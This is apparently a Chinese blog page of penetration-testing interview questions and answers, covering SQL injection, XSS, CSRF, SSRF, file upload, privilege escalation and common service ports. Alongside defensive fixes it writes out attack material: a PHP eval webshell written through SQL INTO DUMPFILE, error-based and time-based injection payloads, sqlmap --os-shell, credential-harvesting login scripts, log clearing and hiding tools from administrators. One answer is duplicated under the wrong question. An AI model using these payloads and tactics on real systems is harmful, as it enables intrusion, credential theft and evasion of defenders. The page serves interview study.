<li><a href="#head13"> 宽字节注入产生原理以及根本原因</a><ul>
<li><a href="#head14"> 产生原理</a></li>
<li><a href="#head15"> 在哪里编码</a></li>
<li><a href="#head16"> 根本原因</a></li>
<li><a href="#head17"> 解决办法</a></li>
<li><a href="#head18"> sql里面只有update怎么利用</a></li>
</ul>
</li>
<li><a href="#head19"> sql如何写shell/单引号被过滤怎么办</a><ul>
<li><a href="#head20"> 代替空格的方法</a></li>
<li><a href="#head21"> mysql的网站注入，5.0以上和5.0以下有什么区别？</a></li>
</ul>
</li>
<li><a href="#head22"> XSS</a><ul>
<li><a href="#head23"> XSS原理</a><ul>
<li><a href="#head24"> 反射型</a></li>
<li><a href="#head25"> 储存型</a></li>
<li><a href="#head26"> DOM型</a></li>
</ul>
</li>
<li><a href="#head27"> DOM型和反射型的区别</a></li>
<li><a href="#head28">DOM型XSS 自动化测试或人工测试</a></li>
<li><a href="#head29"> 如何快速发现xss位置</a></li>
<li><a href="#head30"> 对于XSS怎么修补建议</a></li>
<li><a href="#head31"> XSS蠕虫的产生条件</a></li>
</ul>
</li>
<li><a href="#head32"> CSRF</a><ul>
<li><a href="#head33"> CSRF原理</a></li>
<li><a href="#head34"> 防御</a></li>
<li><a href="#head35"> token和referer做横向对比，谁安全等级高？</a></li>
<li><a href="#head36"> 对referer的验证，从什么角度去做？如果做，怎么杜绝问题</a></li>
<li><a href="#head37"> 针对token，对token测试会注意哪方面内容，会对token的哪方面进行测试？</a></li>
</ul>
</li>
<li><a href="#head38"> SSRF</a><ul>
<li><a href="#head39"> 检测</a></li>
<li><a href="#head40">SSRF漏洞的成因 防御 绕过</a></li>
</ul>
</li>
<li><a href="#head41"> 上传</a><ul>
<li><a href="#head42"> 文件上传漏洞原理</a></li>
<li><a href="#head43"> 常见的上传绕过方式</a></li>
<li><a href="#head44"> 防护</a></li>
<li><a href="#head45"> 审查上传点的元素有什么意义？</a></li>
</ul>
</li>
<li><a href="#head46"> 文件包含</a><ul>
<li><a href="#head47"> 原理</a></li>
<li><a href="#head48"> 导致文件包含的函数</a></li>
<li><a href="#head49"> 本地文件包含</a></li>
</ul>
</li>
<li><a href="#head50"> XXE</a></li>
<li><a href="#head51"> 逻辑漏洞</a><ul>
<li><a href="#head52"> 金融行业常见逻辑漏洞</a></li>
</ul>
</li>
<li><a href="#head53"> 溢出</a></li>
<li><a href="#head54"> 中间人攻击</a><ul>
<li><a href="#head55"> ARP欺骗</a><ul>
<li><a href="#head56"> 原理:</a></li>
<li><a href="#head57"> 防护</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#head58"> DDOS</a><ul>
<li><a href="#head59"> Ddos原理</a><ul>
<li><a href="#head60"> syn洪流的原理</a></li>
<li><a href="#head61"> CC攻击原理</a></li>
</ul>
</li>
<li><a href="#head62"> DDOS防护</a></li>
</ul>
</li>
<li><a href="#head63"> 提权</a><ul>
<li><a href="#head64"> mysql两种提权方式</a><ul>
<li><a href="#head65"> Mysql_UDF提权</a></li>
<li><a href="#head66">Mysql mof提权</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#head67"> 特殊漏洞</a><ul>
<li><a href="#head68"> Struts2-045</a></li>
<li><a href="#head69"> Redis未授权访问</a><ul>
<li><a href="#head70"> 产生原因</a></li>
<li><a href="#head71"> 利用条件和方法</a></li>
<li><a href="#head72"> 修复</a></li>
</ul>
</li>
<li><a href="#head73"> Jenkins未授权访问</a></li>
<li><a href="#head74"> MongoDB未授权访问</a><ul>
<li><a href="#head75"> 防护</a></li>
</ul>
</li>
<li><a href="#head76"> Memcache未授权访问</a><ul>
<li><a href="#head77"> 利用</a></li>
<li><a href="#head78"> 漏洞加固</a></li>
</ul>
</li>
<li><a href="#head79">FFMPEG 本地文件读取漏洞</a><ul>
<li><a href="#head80"> 原理</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#head81"> 安全知识</a><ul>
<li><a href="#head82"> WEB</a><ul>
<li><a href="#head83"> 常用WEB开发JAVA框架</a></li>
<li><a href="#head84"> 同源策略</a></li>
<li><a href="#head85"> Jsonp安全攻防技术，怎么写Jsonp的攻击页面？</a><ul>
<li><a href="#head86"> 涉及到Jsonp的安全攻防内容</a></li>
<li><a href="#head87"> 攻击页面</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#head88"> PHP</a><ul>
<li><a href="#head89"> php中命令执行涉及到的函数</a></li>
<li><a href="#head90">安全模式下绕过php的disable fuction</a></li>
<li><a href="#head91"> PHP弱类型</a></li>
</ul>
</li>
<li><a href="#head92"> 数据库</a><ul>
<li><a href="#head93"> 各种数据库文件存放的位置</a></li>
</ul>
</li>
<li><a href="#head94"> 系统</a><ul>
<li><a href="#head95"> 如何清理日志</a></li>
<li><a href="#head96">入侵 Linux 服务器后需要清除哪些日志？</a></li>
<li><a href="#head97"> LINUX</a><ul>
<li><a href="#head98">查看当前端口连接的命令有哪些？<code>netstat</code> 和 <code>ss</code> 命令的区别和优缺点</a></li>
<li><a href="#head99">反弹 shell 的常用命令？一般常反弹哪一种 shell？为什么?</a></li>
<li><a href="#head100">通过Linux系统的/proc目录 ，能够获取到哪些信息，这些信息可以在安全上有哪些应用？</a></li>
<li><a href="#head101"> linux系统中，检测哪些配置文件的配置项，能够提升SSH的安全性。</a></li>
<li><a href="#head102"> 如何一条命令查看文件内容最后一百行</a></li>
</ul>
</li>
<li><a href="#head103"> Windows</a><ul>
<li><a href="#head104"> 如何加固一个域环境下的Windows桌面工作环境？请给出你的思路。</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#head105"> 密码学</a><ul>
<li><a href="#head106"> AES／DES的具体工作步骤</a></li>
<li><a href="#head107"> RSA算法</a></li>
<li><a href="#head108"> 分组密码的加密模式</a></li>
<li><a href="#head109"> 如何生成一个安全的随机数？</a></li>
<li><a href="#head110"> SSL握手过程</a></li>
<li><a href="#head111"> 对称加密与非对称加密的不同，分别用在哪些方面</a></li>
</ul>
</li>
<li><a href="#head112"> TCP/IP</a><ul>
<li><a href="#head113"> TCP三次握手的过程以及对应的状态转换</a></li>
<li><a href="#head114"> TCP和UDP协议区别</a></li>
<li><a href="#head115"> https的建立过程</a></li>
</ul>
</li>
<li><a href="#head116"> 流量分析</a><ul>
<li><a href="#head117"> wireshark简单的过滤规则</a></li>
</ul>
</li>
<li><a href="#head118"> 防火墙</a><ul>
<li><a href="#head119"> 简述路由器交换机、防火墙等网络设备常用的几个基础配置加固项，以及配置方法。</a></li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="思路流程"><a href="#思路流程" class="headerlink" title=" 思路流程"></a><span id="head1"> 思路流程</span></h2><h3 id="信息收集"><a href="#信息收集" class="headerlink" title=" 信息收集"></a><span id="head2"> 信息收集</span></h3><ol>
<li>服务器的相关信息（真实ip，系统类型，版本，开放端口，WAF等）</li>
<li>网站指纹识别（包括，cms，cdn，证书等），dns记录</li>
<li>whois信息，姓名，备案，邮箱，电话反查（邮箱丢社工库，社工准备等）</li>
<li>子域名收集，旁站，C段等</li>
<li>google hacking针对化搜索，pdf文件，中间件版本，弱口令扫描等</li>
<li>扫描网站目录结构，爆后台，网站banner，测试文件，备份等敏感文件泄漏等</li>
<li>传输协议，通用漏洞，exp，github源码等</li>
</ol>
<h3 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title=" 漏洞挖掘"></a><span id="head3"> 漏洞挖掘</span></h3><ol>
<li>浏览网站，看看网站规模，功能，特点等</li>
<li>端口，弱口令，目录等扫描,对响应的端口进行漏洞探测，比如 rsync,心脏出血，mysql,ftp,ssh弱口令等。</li>
<li>XSS，SQL注入，上传，命令注入，CSRF，cookie安全检测，敏感信息，通信数据传输，暴力破解，任意文件上传，越权访问，未授权访问，目录遍历，文件 包含，重放攻击（短信轰炸），服务器漏洞检测，最后使用漏扫工具等</li>
</ol>
<h3 id="漏洞利用-amp-权限提升"><a href="#漏洞利用-amp-权限提升" class="headerlink" title=" 漏洞利用&amp;权限提升"></a><span id="head4"> 漏洞利用&amp;权限提升</span></h3><ul>
<li>mysql提权，serv-u提权，oracle提权</li>
<li>windows 溢出提权</li>
<li>linux脏牛,内核漏洞提权e</li>
</ul>
<h3 id="清除测试数据-amp-输出报告"><a href="#清除测试数据-amp-输出报告" class="headerlink" title=" 清除测试数据&amp;输出报告"></a><span id="head5"> 清除测试数据&amp;输出报告</span></h3><p>i 日志、测试数据的清理<br>ii 总结，输出渗透测试报告，附修复方案</p>
<h3 id="复测"><a href="#复测" class="headerlink" title=" 复测"></a><span id="head6"> 复测</span></h3><p>验证并发现是否有新漏洞，输出报告，归档</p>
<h2 id="问题"><a href="#问题" class="headerlink" title=" 问题"></a><span id="head7"> 问题</span></h2><p><strong>1.拿到一个待检测的站，你觉得应该先做什么？</strong></p>
<p>​    1) 信息收集<br>​        1. 获取域名的whois信息,获取注册者邮箱姓名电话等，丢社工库里看看有没有泄露密码，然后尝试用泄露的密码进行登录后台。 用邮箱做关键词进行丢进搜索引擎。 利用搜索到的关联信息找出其他邮箱进而得到常用社交账号。 社工找出社交账号，里面或许会找出管理员设置密码的习惯 。 利用已有信息生成专用字典。<br>​        2. 查询服务器旁站以及子域名站点，因为主站一般比较难，所以先看看旁站有没有通用性的cms或者其他漏洞。<br>​        3. 查看服务器操作系统版本，web中间件，看看是否存在已知的漏洞，比如IIS，APACHE,NGINX的解析漏洞<br>​        4. 查看IP，进行IP地址端口扫描，对响应的端口进行漏洞探测，比如 rsync,心脏出血，mysql,ftp,ssh弱口令等。<br>​        5. 扫描网站目录结构，看看是否可以遍历目录，或者敏感文件泄漏，比如php探针<br>​        6. google hack 进一步探测网站的信息，后台，敏感文件    </p>
<p>​    2) 漏洞扫描<br>​        开始检测漏洞，如XSS,XSRF,sql注入，代码执行，命令执行，越权访问，目录读取，任意文件读取，下载，文件包含，<br>​        远程命令执行，弱口令，上传，编辑器漏洞，暴力破解等  </p>
<p>​    3) 漏洞利用<br>​        利用以上的方式拿到webshell，或者其他权限  </p>
<p>​    4) 权限提升<br>​        提权服务器，比如windows下mysql的udf提权，serv-u提权，windows低版本的漏洞，如iis6,pr,巴西烤肉，linux脏牛漏洞，linux内核版本漏洞提权，linux下的mysql system提权以及oracle低权限提权  </p>
<p>​    5) 日志清理  </p>
<p>​    6) 总结报告及修复方案  </p>
<p><strong>2.判断出网站的CMS对渗透有什么意义？</strong></p>
<p>​    查找网上已曝光的程序漏洞。</p>
<p>​    如果开源，还能下载相对应的源码进行代码审计。</p>
<p><strong>3.一个成熟并且相对安全的CMS，渗透时扫目录的意义？</strong></p>
<p>​    敏感文件、二级目录扫描</p>
<p>​    站长的误操作比如：网站备份的压缩文件、说明.txt、二级目录可能存放着其他站点</p>
<p><strong>4.常见的网站服务器容器。</strong></p>
<p>​    IIS、Apache、nginx、Lighttpd、Tomcat</p>
<p><strong>5.mysql注入点，用工具对目标站直接写入一句话，需要哪些条件？</strong></p>
<p>​    root权限以及网站的绝对路径。</p>
<p><strong>6.目前已知哪些版本的容器有解析漏洞，具体举例。</strong></p>
<p>​    <strong>IIS 6.0</strong><br>​    /xx.asp/xx.jpg “xx.asp”是文件夹名</p>
<p>​    IIS 7.0/7.5<br>​    默认Fast-CGI开启，直接在url中图片地址后面输入/1.php，会把正常图片当成php解析</p>
<p>​    Nginx<br>​    版本小于等于0.8.37，利用方法和IIS 7.0/7.5一样，Fast-CGI关闭情况下也可利用。<br>​    空字节代码 xxx.jpg.php</p>
<p>​    Apache<br>​    上传的文件命名为：test.php.x1.x2.x3，Apache是从右往左判断后缀</p>
<p>​    lighttpd<br>​    xx.jpg/xx.php，<strong>不全,请小伙伴们在评论处不吝补充，谢谢！</strong></p>
<p><strong>7.如何手工快速判断目标站是windows还是linux服务器？</strong></p>
<p>​    linux大小写敏感,windows大小写不敏感。</p>
<p><strong>8.为何一个mysql数据库的站，只有一个80端口开放？</strong></p>
<p>​    更改了端口，没有扫描出来。</p>
<p>​    站库分离。</p>
<p>​    3306端口不对外开放</p>
<p><strong>9、3389无法连接的几种情况</strong></p>
<p>​    没开放3389 端口</p>
<p>​    端口被修改</p>
<p>​    防护拦截</p>
<p>​    处于内网(需进行端口转发)</p>
<p><strong>10.如何突破注入时字符被转义？</strong></p>
<p>​    宽字符注入</p>
<p>​    hex编码绕过</p>
<p><strong>11.在某后台新闻编辑界面看到编辑器，应该先做什么？</strong></p>
<p>​    查看编辑器的名称版本,然后搜索公开的漏洞。</p>
<p><strong>12.拿到一个webshell发现网站根目录下有.htaccess文件，我们能做什么？</strong></p>
<p>​    能做的事情很多，用隐藏网马来举例子：<br>​    插入<br>​    &lt;FilesMatch “xxx.jpg”&gt; SetHandler application/x-httpd-php <br>​    .jpg文件会被解析成.php文件。</p>
<p>​    具体其他的事情，不好详说，建议大家自己去搜索语句来玩玩。</p>
<p><strong>13.注入漏洞只能查账号密码？</strong></p>
<p>​    只要权限广，拖库脱到老。</p>
<p><strong>14.安全狗会追踪变量，从而发现出是一句话木马吗？</strong></p>
<p>​    是根据特征码，所以很好绕过了，只要思路宽，绕狗绕到欢，但这应该不会是一成不变的。</p>
<p><strong>15.access 扫出后缀为asp的数据库文件，访问乱码，**</strong>如何实现到本地利用？**</p>
<p>​    迅雷下载，直接改后缀为.mdb。</p>
<p><strong>16.提权时选择可读写目录，为何尽量不用带空格的目录？</strong></p>
<p>​    因为exp执行多半需要空格界定参数</p>
<p><strong>17.某服务器有站点A,B 为何在A的后台添加test用户，访问B的后台。发现也添加上了test用户？</strong></p>
<p>​    同数据库。</p>
<p><strong>18.注入时可以不使用and 或or 或xor，直接order by 开始注入吗？</strong></p>
<p>​    and/or/xor，前面的1=1、1=2步骤只是为了判断是否为注入点，如果已经确定是注入点那就可以省那步骤去。</p>
<p><strong>19:某个防注入系统，在注入时会提示：</strong></p>
<p>系统检测到你有非法注入的行为。<br>已记录您的ip xx.xx.xx.xx<br>时间:2016:01-23<br>提交页面:test.asp?id=15<br>提交内容:and 1=1</p>
<p><strong>20、如何利用这个防注入系统拿shell？</strong></p>
<p>在URL里面直接提交一句话，这样网站就把你的一句话也记录进数据库文件了 这个时候可以尝试寻找网站的配置文件 直接上菜刀链接。</p>
<p><strong>21.上传大马后访问乱码时，有哪些解决办法？</strong></p>
<p>​    浏览器中改编码。</p>
<p><strong>22.审查上传点的元素有什么意义？</strong></p>
<p>​    有些站点的上传文件类型的限制是在前端实现的，这时只要增加上传类型就能突破限制了。</p>
<p><strong>23.目标站禁止注册用户，找回密码处随便输入用户名提示：“此用户不存在”，你觉得这里怎样利用？</strong></p>
<p>​    先爆破用户名，再利用被爆破出来的用户名爆破密码。</p>
<p>​    其实有些站点，在登陆处也会这样提示</p>
<p>​    所有和数据库有交互的地方都有可能有注入。</p>
<p><strong>24.目标站发现某txt的下载地址为</strong><a href="http://www.test.com/down/down.php?file=/upwdown/1.txt，你有什么思路？" target="_blank" rel="noopener">http://www.test.com/down/down.php?file=/upwdown/1.txt，你有什么思路？</a></p>
<p>​    这就是传说中的下载漏洞！在file=后面尝试输入index.php下载他的首页文件，然后在首页文件里继续查找其他网站的配置文件，可以找出网站的数据库密码和数据库的地址。</p>
<p><strong>25.甲给你一个目标站，并且告诉你根目录下存在/abc/目录，并且此目录下存在编辑器和admin目录。请问你的想法是？</strong></p>
<p>​    直接在网站二级目录/abc/下扫描敏感文件及目录。</p>
<p><strong>26.在有shell的情况下，如何使用xss实现对目标站的长久控制？</strong></p>
<p>​    后台登录处加一段记录登录账号密码的js，并且判断是否登录成功，如果登录成功，就把账号密码记录到一个生僻的路径的文件中或者直接发到自己的网站文件中。(此方法适合有价值并且需要深入控制权限的网络)。</p>
<p>​    在登录后才可以访问的文件中插入XSS脚本。</p>
<p><strong>27.后台修改管理员密码处，原密码显示为*。你觉得该怎样实现读出这个用户的密码？</strong></p>
<p>​    审查元素 把密码处的password属性改成text就明文显示了</p>
<p><strong>28.目标站无防护，上传图片可以正常访问，上传脚本格式访问则403.什么原因？</strong></p>
<p>​    原因很多，有可能web服务器配置把上传目录写死了不执行相应脚本，尝试改后缀名绕过</p>
<p><strong>29.审查元素得知网站所使用的防护软件，你觉得怎样做到的？</strong></p>
<p>​    在敏感操作被拦截，通过界面信息无法具体判断是什么防护的时候，F12看HTML体部 比如护卫神就可以在名称那看到<hws>内容<hws>。</hws></hws></p>
<p><strong>30.在win2003服务器中建立一个 .zhongzi文件夹用意何为？</strong></p>
<p>​    隐藏文件夹，为了不让管理员发现你传上去的工具。</p>
<p><strong>31、sql注入有以下两个测试选项，选一个并且阐述不选另一个的理由：</strong></p>
<p>A. demo.jsp?id=2+1       B. demo.jsp?id=2-1<br>选B，在 URL 编码中 + 代表空格，可能会造成混淆</p>
<p><strong>32、以下链接存在 sql 注入漏洞，对于这个变形注入，你有什么思路？</strong></p>
<p>demo.do?DATA=AjAxNg==<br>DATA有可能经过了 base64 编码再传入服务器，所以我们也要对参数进行 base64 编码才能正确完成测试</p>
<p><strong>33、发现 demo.jsp?uid=110 注入点，你有哪几种思路获取 webshell，哪种是优选？</strong></p>
<p>有写入权限的，构造联合查询语句使用using INTO OUTFILE，可以将查询的输出重定向到系统的文件中，这样去写入 WebShell<br>使用 sqlmap –os-shell 原理和上面一种相同，来直接获得一个 Shell，这样效率更高<br>通过构造联合查询语句得到网站管理员的账户和密码，然后扫后台登录后台，再在后台通过改包上传等方法上传 Shell</p>
<p><strong>34、CSRF 和 XSS 和 XXE 有什么区别，以及修复方式？</strong></p>
<p><strong>XSS是跨站脚本攻击</strong>，用户提交的数据中可以构造代码来执行，从而实现窃取用户信息等攻击。修复方式：对字符实体进行转义、使用HTTP Only来禁止JavaScript读取Cookie值、输入时校验、浏览器与Web应用端采用相同的字符编码。</p>
<p><strong>CSRF是跨站请求伪造攻击</strong>，XSS是实现CSRF的诸多手段中的一种，是由于没有在关键操作执行时进行是否由用户自愿发起的确认。修复方式：筛选出需要防范CSRF的页面然后嵌入Token、再次输入密码、检验Referer<br>XXE是XML外部实体注入攻击，XML中可以通过调用实体来请求本地或者远程内容，和远程文件保护类似，会引发相关安全问题，例如敏感文件读取。修复方式：XML解析库在调用时严格禁止对外部实体的解析。</p>
<p><strong>35、CSRF、SSRF和重放攻击有什么区别？</strong></p>
<p>CSRF是跨站请求伪造攻击，由客户端发起<br>SSRF是服务器端请求伪造，由服务器发起<br>重放攻击是将截获的数据包进行重放，达到身份认证等目的</p>
<p><strong>36、说出至少三种业务逻辑漏洞，以及修复方式？</strong></p>
<p><strong>密码找回漏洞</strong>中存在</p>
<p>1）密码允许暴力破解、</p>
<p>2）存在通用型找回凭证、</p>
<p>3）可以跳过验证步骤、</p>
<p>4）找回凭证可以拦包获取</p>
<p>等方式来通过厂商提供的密码找回功能来得到密码。<br><strong>身份认证漏洞</strong>中最常见的是</p>
<p>1）会话固定攻击</p>
<p>2） Cookie 仿冒</p>
<p>只要得到 Session 或 Cookie 即可伪造用户身份。<br><strong>验证码漏洞</strong>中存在</p>
<p>1）验证码允许暴力破解</p>
<p>2）验证码可以通过 Javascript 或者改包的方法来进行绕过</p>
<p><strong>37、圈出下面会话中可能存在问题的项，并标注可能会存在的问题？</strong></p>
<p>get /ecskins/demo.jsp?uid=2016031900&amp;keyword=”hello world”<br>HTTP/1.1Host:<strong><em>.com:82User-Agent:Mozilla/<br>5.0 Firefox/40Accept:text/css,/;q=0.1<br>Accept-Language:zh-CN;zh;q=0.8;en-US;q=0.5,en;q=0.3<br>Referer:http://****</em></strong>.com/eciop/orderForCC/<br>cgtListForCC.htm?zone=11370601&amp;v=145902<br>Cookie:myguid1234567890=1349db5fe50c372c3d995709f54c273d;<br>uniqueserid=session_OGRMIFIYJHAH5_HZRQOZAMHJ;<br>st_uid=N90PLYHLZGJXI-NX01VPUF46W;<br>status=True<br>Connection:keep-alive</p>
<p>有写入权限的，构造联合查询语句使用using INTO OUTFILE，可以将查询的输出重定向到系统的文件中，这样去写入 WebShell<br>使用 sqlmap –os-shell 原理和上面一种相同，来直接获得一个 Shell，这样效率更高<br>通过构造联合查询语句得到网站管理员的账户和密码，然后扫后台登录后台，再在后台通过改包上传等方法上传 Shell</p>
<p><strong>38、给你一个网站你是如何来渗透测试的?</strong><br>在获取书面授权的前提下。</p>
<p><strong>39、sqlmap，怎么对一个注入点注入？</strong><br>1）如果是get型号，直接，sqlmap -u “诸如点网址”.<br>2) 如果是post型诸如点，可以sqlmap -u “注入点网址” –data=”post的参数”<br>3）如果是cookie，X-Forwarded-For等，可以访问的时候，用burpsuite抓包，注入处用号替换，放到文件里，然后sqlmap -r “文件地址”</p>
<p><strong>40、nmap，扫描的几种方式</strong></p>
<p><strong>41、sql注入的几种类型？</strong><br>1）报错注入<br>2）bool型注入<br>3）延时注入<br>4）宽字节注入<br><strong>42、报错注入的函数有哪些？ 10个</strong><br>1）and extractvalue(1, concat(0x7e,(select @@version),0x7e))】】】<br>2）通过floor报错 向下取整<br>3）+and updatexml(1, concat(0x7e,(secect @@version),0x7e),1)<br>4）.geometrycollection()select from test where id=1 and geometrycollection((select from(selectfrom(select user())a)b));<br>5）.multipoint()select from test where id=1 and multipoint((select from(select from(select user())a)b));<br>6）.polygon()select from test where id=1 and polygon((select from(select from(select user())a)b));<br>7）.multipolygon()select from test where id=1 and multipolygon((select from(select from(select user())a)b));<br>8）.linestring()select from test where id=1 and linestring((select from(select from(select user())a)b));<br>9）.multilinestring()select from test where id=1 and multilinestring((select from(select from(select user())a)b));<br>10）.exp()select from test where id=1 and exp(~(select * from(select user())a));</p>
<p><strong>43、延时注入如何来判断？</strong><br>if(ascii(substr(“hello”, 1, 1))=104, sleep(5), 1)</p>
<p><strong>44、盲注和延时注入的共同点？</strong><br>都是一个字符一个字符的判断</p>
<p><strong>45、如何拿一个网站的webshell？</strong><br>上传，后台编辑模板，sql注入写文件，命令执行，代码执行，<br>一些已经爆出的cms漏洞，比如dedecms后台可以直接建立脚本文件，wordpress上传插件包含脚本文件zip压缩包等</p>
<p><strong>46、sql注入写文件都有哪些函数？</strong><br>select ‘一句话’ into outfile ‘路径’<br>select ‘一句话’ into dumpfile ‘路径’<br>select ‘<?php eval($_POST[1]) ?>‘ into dumpfile  ‘d:\wwwroot\baidu.com\nvhack.php’;</p>
<p><strong>47、如何防止CSRF?</strong><br>1,验证referer<br>2，验证token<br>详细：<a href="http://cnodejs.org/topic/5533dd6e9138f09b629674fd" target="_blank" rel="noopener">http://cnodejs.org/topic/5533dd6e9138f09b629674fd</a></p>
<p><strong>48、owasp 漏洞都有哪些？</strong><br>1、SQL注入防护方法：<br>2、失效的身份认证和会话管理<br>3、跨站脚本攻击XSS<br>4、直接引用不安全的对象<br>5、安全配置错误<br>6、敏感信息泄露<br>7、缺少功能级的访问控制<br>8、跨站请求伪造CSRF<br>9、使用含有已知漏洞的组件<br>10、未验证的重定向和转发</p>
<p><strong>49、SQL注入防护方法？</strong><br>1、使用安全的API<br>2、对输入的特殊字符进行Escape转义处理<br>3、使用白名单来规范化输入验证方法<br>4、对客户端输入进行控制，不允许输入SQL注入相关的特殊字符<br>5、服务器端在提交数据库进行SQL查询之前，对特殊字符进行过滤、转义、替换、删除。</p>
<p><strong>50、代码执行，文件读取，命令执行的函数都有哪些？</strong></p>
<p>1）代码执行：</p>
<p>eval,preg_replace+/e,assert,call_user_func,call_user_func_array,create_function</p>
<p>2）文件读取：</p>
<p>file_get_contents(),highlight_file(),fopen(),read </p>
<p>file(),fread(),fgetss(), fgets(),parse_ini_file(),show_source(),file()等<br>3)命令执行：</p>
<p>system(), exec(), shell_exec(), passthru() ,pcntl_exec(), popen(),proc_open()</p>
<p><strong>51、img标签除了onerror属性外，还有其他获取管理员路径的办法吗？</strong><br>src指定一个远程的脚本文件，获取referer</p>
<p><strong>52、img标签除了onerror属性外，并且src属性的后缀名，必须以.jpg结尾，怎么获取管理员路径。</strong></p>
<p>1）远程服务器修改apache配置文件，配置.jpg文件以php方式来解析<br>AddType application/x-httpd-php .jpg<br>&lt;img src=<a href="http://xss.tv/1.jpg" target="_blank" rel="noopener">http://xss.tv/1.jpg</a>&gt; 会以php方式来解析</p>
<p><strong>53、为什么aspx木马权限比asp大？</strong></p>
<p>aspx使用的是.net技术。IIS 中默认不支持，ASP只是脚本语言而已。入侵的时候asp的木马一般是guest权限…APSX的木马一般是users权限。</p>
<p><strong>54、如何绕过waf？</strong></p>
<ul>
<li>大小写转换法</li>
<li>干扰字符 <code>/*!*/</code></li>
<li>编码 base64 unicode hex url ascll</li>
<li>复参数</li>
</ul>
<p><strong>55、如何向服务器写入webshell？</strong></p>
<ul>
<li>各种上传漏洞</li>
<li>mysql具有写入权限,用sql语句写入shell</li>
<li>http put方法</li>
</ul>
<p><strong>56、渗透测试中常见的端口</strong></p>
<p>1,web类(web漏洞/敏感目录)<br>第三方通用组件漏洞struts thinkphp jboss ganglia zabbix</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">80 web </span><br><span class="line">80-89 web </span><br><span class="line">8000-9090 web</span><br></pre></td></tr></table></figure>
<p>2,数据库类(扫描弱口令)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1433 MSSQL </span><br><span class="line">1521 Oracle </span><br><span class="line">3306 MySQL </span><br><span class="line">5432 PostgreSQL</span><br></pre></td></tr></table></figure>
<p>3,特殊服务类(未授权/命令执行类/漏洞)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">443 SSL心脏滴血 </span><br><span class="line">873 Rsync未授权 </span><br><span class="line">5984 CouchDB http://xxx:5984/_utils/ </span><br><span class="line">6379 redis未授权 </span><br><span class="line">7001,7002 WebLogic默认弱口令，反序列 </span><br><span class="line">9200,9300 elasticsearch 参考WooYun: 多玩某服务器ElasticSearch命令执行漏洞 </span><br><span class="line">11211 memcache未授权访问 </span><br><span class="line">27017,27018 Mongodb未授权访问 </span><br><span class="line">50000 SAP命令执行 </span><br><span class="line">50070,50030 hadoop默认端口未授权访问</span><br></pre></td></tr></table></figure>
<p>4,常用端口类(扫描弱口令/端口爆破)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">21 ftp </span><br><span class="line">22 SSH </span><br><span class="line">23 Telnet </span><br><span class="line">2601,2604 zebra路由，默认密码zebra</span><br><span class="line">3389 远程桌面</span><br></pre></td></tr></table></figure>
<blockquote>
<p>端口合计详情</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">21 ftp </span><br><span class="line">22 SSH </span><br><span class="line">23 Telnet </span><br><span class="line">80 web </span><br><span class="line">80-89 web </span><br><span class="line">161 SNMP </span><br><span class="line">389 LDAP </span><br><span class="line">443 SSL心脏滴血以及一些web漏洞测试 </span><br><span class="line">445 SMB </span><br><span class="line">512,513,514 Rexec </span><br><span class="line">873 Rsync未授权 </span><br><span class="line">1025,111 NFS </span><br><span class="line">1433 MSSQL </span><br><span class="line">1521 Oracle:(iSqlPlus Port:5560,7778) </span><br><span class="line">2082/2083 cpanel主机管理系统登陆 （国外用较多）</span><br><span class="line">2222 DA虚拟主机管理系统登陆 （国外用较多） </span><br><span class="line">2601,2604 zebra路由，默认密码zebra</span><br><span class="line">3128 squid代理默认端口，如果没设置口令很可能就直接漫游内网了 </span><br><span class="line">3306 MySQL </span><br><span class="line">3312/3311 kangle主机管理系统登陆 </span><br><span class="line">3389 远程桌面 </span><br><span class="line">4440 rundeck 参考WooYun: 借用新浪某服务成功漫游新浪内网 </span><br><span class="line">5432 PostgreSQL </span><br><span class="line">5900 vnc </span><br><span class="line">5984 CouchDB http://xxx:5984/_utils/ </span><br><span class="line">6082 varnish 参考WooYun: Varnish HTTP accelerator CLI 未授权访问易导致网站被直接篡改或者作为代理进入内网 </span><br><span class="line">6379 redis未授权 </span><br><span class="line">7001,7002 WebLogic默认弱口令，反序列 </span><br><span class="line">7778 Kloxo主机控制面板登录 </span><br><span class="line">8000-9090 都是一些常见的web端口，有些运维喜欢把管理后台开在这些非80的端口上 </span><br><span class="line">8080 tomcat/WDCP主机管理系统，默认弱口令 </span><br><span class="line">8080,8089,9090 JBOSS </span><br><span class="line">8083 Vestacp主机管理系统 （国外用较多） </span><br><span class="line">8649 ganglia </span><br><span class="line">8888 amh/LuManager 主机管理系统默认端口 </span><br><span class="line">9200,9300 elasticsearch 参考WooYun: 多玩某服务器ElasticSearch命令执行漏洞 </span><br><span class="line">10000 Virtualmin/Webmin 服务器虚拟主机管理系统 </span><br><span class="line">11211 memcache未授权访问 </span><br><span class="line">27017,27018 Mongodb未授权访问 </span><br><span class="line">28017 mongodb统计页面 </span><br><span class="line">50000 SAP命令执行 </span><br><span class="line">50070,50030 hadoop默认端口未授权访问</span><br></pre></td></tr></table></figure>

<h2 id="深信服一面"><a href="#深信服一面" class="headerlink" title=" 深信服一面:"></a><span id="head8"> 深信服一面:</span></h2><ul>
<li>了解哪些漏洞</li>
<li>文件上传有哪些防护方式</li>
<li>用什么扫描端口，目录</li>
<li>如何判断注入</li>
<li>注入有防护怎么办</li>
<li>有没有写过tamper</li>
<li>3306 1443 8080是什么端口</li>
<li>计算机网络从物理层到应用层xxxx</li>
<li>有没有web服务开发经验</li>
<li>如何向服务器写入webshell</li>
<li>有没有用过xss平台</li>
<li>网站渗透的流程</li>
<li>mysql两种提权方式（udf，？）</li>
<li>常见加密方式xxx</li>
<li>ddos如何防护</li>
<li>有没有抓过包，会不会写wireshark过滤规则</li>
<li>清理日志要清理哪些</li>
</ul>
